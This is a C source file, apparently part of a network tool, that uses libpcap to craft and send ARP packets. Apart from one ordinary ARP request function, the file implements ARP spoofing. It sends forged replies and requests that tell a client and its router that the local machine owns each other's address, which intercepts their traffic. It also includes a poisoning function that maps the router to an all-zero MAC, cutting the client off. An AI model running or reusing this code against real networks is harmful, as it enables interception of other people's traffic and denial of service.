#include <pcap.h>
#include "NetHeaders.h"
#include "ArpSend.h"
#include "PacketBuilder.h"
#include "GeneralSettings.h"
#include "Mode.h"

extern local_host_t local_host;
extern pcap_t * fp;
extern settings_t settings;

int SendLegalArpRequest(struct sockaddr_in * addr)
{
	packet_t packet;
	ethhdr_t eth;
	arp_t arp;
	
	CreatePacket(&packet);

	memcpy(&eth.h_source, &local_host.mac, 6);
	memset(&eth.h_dest, 0xff, 6);
	eth.h_proto=htons(ETH_P_ARP);

	AddData(&packet,&eth, sizeof(eth));

	arp.hardware_size=6;
	arp.protocol_size=4;
	arp.hardware_type=htons(ARP_P_ETH);
	arp.opcode=htons(ARP_REQUEST);
	arp.protocol_type=htons(ETH_P_IP);

	memcpy(&arp.sender_ip, &local_host.local_host->sin_addr, 4);
	memcpy(&arp.taget_ip, &addr->sin_addr, 4);
	
	memcpy(&arp.sender_mac, &local_host.mac, 6);
	memset(&arp.taget_mac, 0xff, 6);

	AddData(&packet,&arp, sizeof(arp));

	if(pcap_sendpacket(fp, packet.data, packet.size ) != 0)
    {
		printf("Error sending packet!\n");
		DestroyPacket(&packet);
		return -1;
    }

	DestroyPacket(&packet);
	return 0;
}

int SendSpoofArp(uint32_t ip_source, uint8_t  * mac_source, uint32_t ip_dest, uint8_t  * mac_dest, uint16_t type)
{
	packet_t packet;
	ethhdr_t eth;
	arp_t arp;
	
	CreatePacket(&packet);

	memcpy(&eth.h_source, mac_source, 6);
	memcpy(&eth.h_dest, mac_dest, 6);
	eth.h_proto=htons(ETH_P_ARP);

	AddData(&packet,&eth, sizeof(eth));

	arp.hardware_size=6;
	arp.protocol_size=4;
	arp.hardware_type=htons(ARP_P_ETH);
	arp.opcode=htons(type);
	arp.protocol_type=htons(ETH_P_IP);

	memcpy(&arp.sender_ip, &ip_source, 4);
	memcpy(&arp.taget_ip, &ip_dest, 4);
	
	memcpy(&arp.sender_mac, mac_source, 6);
	memcpy(&arp.taget_mac, mac_dest, 6);

	AddData(&packet,&arp, sizeof(arp));

	if(pcap_sendpacket(fp, packet.data, packet.size ) != 0)
    {
		printf("Error sending packet!\n");
		DestroyPacket(&packet);
		return -1;
    }

	DestroyPacket(&packet);
	return 0;
}

int SendSpoofArpReplies()
{
	SendSpoofArp(settings.arp_spoofing_settings.ip_client, local_host.mac, settings.arp_spoofing_settings.ip_router, settings.arp_spoofing_settings.mac_router, ARP_RESPONSE);
	SendSpoofArp(settings.arp_spoofing_settings.ip_router, local_host.mac, settings.arp_spoofing_settings.ip_client, settings.arp_spoofing_settings.mac_client, ARP_RESPONSE);
	return 0;
}

int SendSpoofArpRequests()
{
	SendSpoofArp(settings.arp_spoofing_settings.ip_client, local_host.mac, settings.arp_spoofing_settings.ip_router, settings.arp_spoofing_settings.mac_router, ARP_REQUEST);
	SendSpoofArp(settings.arp_spoofing_settings.ip_router, local_host.mac, settings.arp_spoofing_settings.ip_client, settings.arp_spoofing_settings.mac_client, ARP_REQUEST);
	return 0;
}

int SendPoisonArpPacket()
{
	uint8_t mac[6]={0x00,0x00,0x00,0x00,0x00,0x00};
	SendSpoofArp(settings.arp_spoofing_settings.ip_router, mac, settings.arp_spoofing_settings.ip_client, settings.arp_spoofing_settings.mac_client, ARP_RESPONSE);
	return 0;
}

int SendFakeArpReply()
{
	SendSpoofArp(settings.arp_spoofing_settings.ip_fake, settings.arp_spoofing_settings.mac_router, settings.arp_spoofing_settings.ip_client, settings.arp_spoofing_settings.mac_client, ARP_RESPONSE);
	return 0;
}

